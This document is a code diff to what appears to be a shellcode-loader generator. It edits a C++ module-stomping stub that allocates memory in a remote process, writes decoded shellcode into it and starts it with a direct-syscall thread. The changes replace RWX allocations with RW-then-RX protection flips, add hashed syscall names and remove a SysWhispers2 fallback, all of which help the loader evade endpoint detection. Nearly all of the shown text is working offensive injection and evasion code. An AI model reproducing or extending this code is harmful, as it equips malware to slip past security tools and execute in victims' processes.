@@ -1127,9 +1127,9 @@ module_stomping_stub = """
     SIZE_T moduleSize = sizeof(moduleToInject) + 2;
     SIZE_T shimSize = sizeof shim;
 
-    res = NtAllocateVirtualMemory(processHandle, &allocModule, 0, &moduleSize, MEM_COMMIT | MEM_RESERVE, 0x40);
+    res = NtAllocateVirtualMemory(processHandle, &allocModule, 0, &moduleSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     safe_print(skCrypt("NtAllocateVirtualMemory res (allocModule): "), res);
-    res = NtAllocateVirtualMemory(processHandle, &allocShim, 0, &shimSize, MEM_COMMIT | MEM_RESERVE, 0x40);
+    res = NtAllocateVirtualMemory(processHandle, &allocShim, 0, &shimSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     safe_print(skCrypt("NtAllocateVirtualMemory res (allocShim): "), res);
     
     auto eString = skCrypt("allocShim:   ");
@@ -1148,6 +1148,10 @@ module_stomping_stub = """
         safe_print(skCrypt("[!] NtWriteVirtualMemory FAILED! This happens occassionally due to an unkown bug."));
         return 1;
     }
+
+    //Flip RW bit to RX for shim execution
+    res = NtProtectVirtualMemory(processHandle, &allocShim, &shimSize, PAGE_EXECUTE_READ, &oldProtect);
+    safe_print(skCrypt("NtProtectVirtualMemory res (Shim): "), res);
 
     res = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, processHandle, allocShim, allocModule, FALSE, 0, 0, 0, NULL);
     safe_print(skCrypt("NtCreateThreadEx res (Shim): "), res);
@@ -1212,10 +1216,14 @@ module_stomping_stub = """
     printf("%s%#p\\n", eString6.decrypt(), jankOffset);
     eString6.clear();
 
-    res = NtProtectVirtualMemory(processHandle, &remoteFuncAddress, &shellcodeLen, 0x40, &oldProtect);
+    res = NtProtectVirtualMemory(processHandle, &remoteFuncAddress, &shellcodeLen, PAGE_READWRITE, &oldProtect);
     safe_print(skCrypt("NtProtectVirtualMemory res (shellcode): "), res);
     res = NtWriteVirtualMemory(processHandle, (LPVOID)((uintptr_t)remoteFuncAddress + jankOffset), decoded, shellcodeLen, &bytesWritten2);
     safe_print(skCrypt("NtWriteVirtualMemory res (shellcode): "), res);
+
+    // Flip RW bit to RX
+    res = NtProtectVirtualMemory(processHandle, &remoteFuncAddress, &shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);
+    safe_print(skCrypt("NtProtectVirtualMemory res (shellcode): "), res);
 
     HANDLE hThread2;
     res = NtCreateThreadEx(&hThread2, GENERIC_EXECUTE, NULL, processHandle, funcAddress, NULL, FALSE, 0, 0, 0, NULL);
@@ -1881,6 +1889,8 @@ def get_function_hash(seed, function_name):
     function_hash = seed
     if function_name[:2] == 'Nt':
         function_name = 'Zw' + function_name[2:]
+    if function_name[:3] == 'New':
+        function_name = 'Zw' + function_name[5:]
     name = function_name + '\0'
     ror8 = lambda v: ((v >> 8) & (2 ** 32 - 1)) | ((v << 24) & (2 ** 32 - 1))
 
@@ -1895,6 +1905,7 @@ def replace_syscall_hashes(seed):
         code = f.read()
     regex = re.compile(r'#define (Nt[^(]+) ')
     syscall_names = re.findall(regex, code)
+    syscall_names.extend(["NewNtClose", "NewNtQueryInformationProcess", "NewNtWaitForSingleObject"])
     syscall_names = set(syscall_names)
     syscall_definitions = code.split('EXTERN_C DWORD SW2_GetSyscallNumber')[2]
 
@@ -2047,9 +2058,6 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
         stub = stub.replace("REPLACE_STUB_METHOD", module_stomping_stub)
         stub = stub.replace("REPLACE_ME_PROCESS", process)
         print("[+] Using {} for ModuleStomping".format(process))
-        if syscall_arg == "syswhispers2":
-            print("[+] SysWhispers2 is not supported for this shellcode execution method!")
-            syscall_arg = "getsyscallstub"
     if method == "enumdisplaymonitors":
         stub = stub.replace("REPLACE_THREADLESS_FUNCTIONS", "")
         stub = stub.replace("REPLACE_THREADLESS_DEFINITIONS", "")
